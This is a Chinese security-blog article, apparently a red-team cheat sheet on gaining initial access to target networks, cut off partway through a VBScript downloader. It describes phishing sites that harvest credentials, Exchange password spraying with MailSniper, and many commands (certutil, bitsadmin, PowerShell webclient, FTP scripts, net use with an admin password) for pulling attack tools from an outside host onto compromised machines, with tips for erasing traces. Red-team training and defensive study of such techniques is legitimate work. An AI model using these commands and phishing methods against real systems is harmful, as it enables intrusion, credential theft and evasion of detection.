---
title: 干货 | 红队渗透系列之获取入口打点总结
url: https://www.secpulse.com/archives/188994.html
source: 安全脉搏
date: 2022-10-14
fetch_date: 2025-10-03T19:49:07.104542
---

# 干货 | 红队渗透系列之获取入口打点总结

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 干货 | 红队渗透系列之获取入口打点总结

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[HACK\_Learn](https://www.secpulse.com/newpage/author?author_id=8971)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-10-13

12,130

获取入口，拿 Shell。

## **目录结构**

* 获取入口

+ 邮件钓鱼
+ Word/Excel 宏文件
+ 制作钓鱼站点

+ SPF 邮件伪造
+ DMARC
+ DKIM
+ 学习资料

+ Wi-Fi
+ 网线
+ Bad USB
+ Exchange
+ Office 365

+ 开源应用
+ Web 集成环境
+ Web
+ Password spraying
+ 近源渗透
+ 社会工程学
+ Phishing

* 文件传输

+ Windows 主机
+ Linux 主机
+ 编程语言

* Reverse Shell

+ Windows
+ Linux

* 建立隧道

+ venom
+ Proxifier
+ FRP
+ proxychanis
+ nps
+ SSH

* 参考资料

##

## **获取入口**

### Web

能够拿权限的漏洞：

* SQL Injection
* RCE

+ 反序列化
+ 代码执行
+ 命令执行

* 文件上传
* 弱口令

以及打现有 NDay。

#### 开源应用

> 每个小节里面内容可以写出一系列文章，将其贴入即可。如 Struts2
>
> Struts2：
>
> * [CVEXXXX-XXXX 分析]()
> * ......

Struts2
ThinkPHP
Shiro
fastjson
ElasticSearch
Dedecms
PHPCMS
ECshop
Metinfo
Discuz
帝国CMS
phpMyAdmin
WordPress
Joomla
Drupal
ActiveMQ
Solr
RabbitMQ
ZooKeeper
Typecho
SiteServer
禅道
通达 OA

**WebServer**

WebLogic
Jboss
WildFly（前身叫 Jboss）
Tomcat
IBM WebSphere
Axis2
GlassFish
IIS
Jekins

#### **Web 集成环境**

一般偷懒或者不会搭建环境的人使用，没有权限意识则的会用管理员运行权限启动，如 Administrator 或 Root。

宝塔
PHPStudy
AppServ
Xampp

### **Password spraying**

密码喷洒和暴力破解区别是什么呢？前者是一个密码对多个账户进行登录，后者是一个账户尽可能使用多个密码尝试登录。

#### **Exchange**

https://github.com/dafthack/MailSniper

导入。

```
ipmo .MailSniper.ps1
```

获取 netbios 名。

```
Invoke-DomainHarvestOWA-ExchHostname <host>
```

验证邮箱名。

```
Invoke-DomainHarvestOWA-ExchHostname -UserList .userName.txt -OutFile sprayed-ews-creds.txt
```

验证子域邮箱名

```
Invoke-DomainHarvestOWA-ExchHostname -Domain <domain> -UserList .userName.txt -OutFile sprayed-ews-creds.txt
```

#### **Office 365**

### **近源渗透**

```
物理渗透、物理攻击、近源渗透，这几个的意思都是在接近目标进行安全测试。
```

#### **Wi-Fi**

#### **网线**

没有终端准入控制，直接插网线 DHCP 获取 IP。

#### **Bad USB**

Black Hat 上提出 Bad USB。

### **社会工程学**

在信息收集过程中就开始。

钓鱼本质是利用人的信任。

信息收集开始就发钓鱼，有个时间差，人家不一定点呢

#### 学习资料

###

https://attack.mitre.org/techniques/T1566/

https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki#phishing-setup

#### **邮件钓鱼**

```
邮件SPF 邮件伪造DMARCDKIM
```

#### **Word/Excel 宏文件**

Spearphishing Attachment

#### **制作钓鱼站点**

1. 选择一个相似域名，比如 www.baidu.com，变为 www.baidU.com
2. 制作 Web 页面

vpn

oa

Nginx 反向代理嗅探明文账户。

模拟出一个真实钓鱼页面，迷惑受害者输入账户，通过 JS 正则验证输入账户是否正确，所有信息格式正确后通过 Javascript Fetch or XMLHttpRequest API 发送数据到服务器，服务器通过参数来获取数据并存入本地数据库或文件。

## **文件传输**

建立隧道或者内网横向时肯定要往服务器传文件，用 WebShell 就很方便。如果这台机器本身没有 WebShell，可以用系统自带程序下载文件，如 wget。

本小节使用如 certutil 证书工具，它原本意图不是用来下载文件的，但是可以这么干，有一个项目叫 LOLBAS 介绍了 Windows 下所有可以用来帮助渗透的程序，Linux 有 GTFOBins。

### Windows 主机

**FTP**

服务端开启 FTP 服务。

```
pip install pyftpdlib
python3 -m pyftpdlib
```

还有部分选项可以指定：

* -i，指定 IP 地址（默认本机地址）
* -p，指定端口（默认 2121）
* -w，写权限（默认为只读）
* -d，指定目录 （默认为当前目录）
* -u，指定用户名登录
* -P，设置登录密码

客户端连接。

1.运行 `copy con <FileName>` 把 FTP 配置写入到 `<FileName>`，复制的文件 con 是键盘输入。

```
open <Host> <Port>
anonymous
anonymous
get <Tool>
bye
```

open 是连接到 FTP 服务器，后面 anonymous 是账户，get 是下载文件，quit 断开连接。

真实利用中不会有交互式 Shell 使用，FTP 使用 -s 选项执行 `<FileName>` 中 FTP 命令解决。

```
ftp -s:<FileName>
```

**bitsadmin**

> Bitsadmin is a command-line tool used to create, download or upload jobs, and to monitor their progress
> https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin

```
bitsadmin /transfer <JobName> http://<Host>/<Filename> <SaveFileName>
```

**certutil**

证书管理工具下载文件到当前目录。

```
certutil -urlcache -split -f http://<Host>/<Filename>
```

使用 certutil 下载的文件会原封不动在 `%USERPROFILE%AppDataLocalLowMicrosoftCryptnetUrlCacheContent` 目录下保存一份，文件名位随机字符，使用 delete 可以删除刚下载的缓存。

```
certutil -urlcache -split -f http://<Host>/<Filename> delete
```

**PowerShell**

```
powershell (new-object system.net.webclient).downloadfile('http://<HOST>/<Filename>', '<Filename>')

powershell -c "$p=new-object system.net.webclient;$p.DownloadFile('http://<HOST>/<Filename>', '<Filename>')"

// invoke-WebRequest 可以简写成 iwr、wget、curl
powershell invoke-WebRequest -uri 'http://<HOST>/<Filename>' -OutFile '<Filename>'
```

**scp**

```
// 拷贝单个文件到当前目录
scp <UserName>@<Host>:<AbsoluteFilePath> ./

// 拷贝目录到当前目录
scp -r <UserName>@<Host>:<AbsoluteFilePath> ./
```

*OPSEC：连接远程服务器在 %USERPROFILE%.sshknown\_hosts 会留下主机 IP 和公钥信息。*

**File Sharing**

net use 使用管理员账户才能建立 IPC 连接。

```
// 用户名为 administrator 密码为 123123 的账户登录到 <Host>，将其共享盘符 C 盘映射到本地 K 盘。
net use K: \<Host>C$ "123123" /user:administrator
```

删除连接。

```
net use \<Host> /del
```

**VBScript**

直接在目标机器上输出重定向脚本。

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))...